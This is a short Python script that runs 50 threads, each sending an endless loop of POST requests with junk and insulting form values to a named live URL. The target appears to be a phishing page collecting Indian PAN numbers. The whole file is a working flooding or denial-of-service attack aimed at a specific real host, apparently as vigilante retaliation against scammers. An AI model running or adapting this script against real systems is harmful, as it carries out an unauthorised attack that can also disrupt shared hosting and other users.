import requests
import threading
url = "https://prestashop-179074-0.cloudclusters.net/4tha.php"
data = {
    "Full_name": "Your dad here stop scamming",
    "PAN_No": "FUCKU6969D",
}
def doreq():
    while True:
        response = requests.post(url, data=data)
        print(response)


threads = []
for i in range(50):
    t = threading.Thread(target=doreq)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()

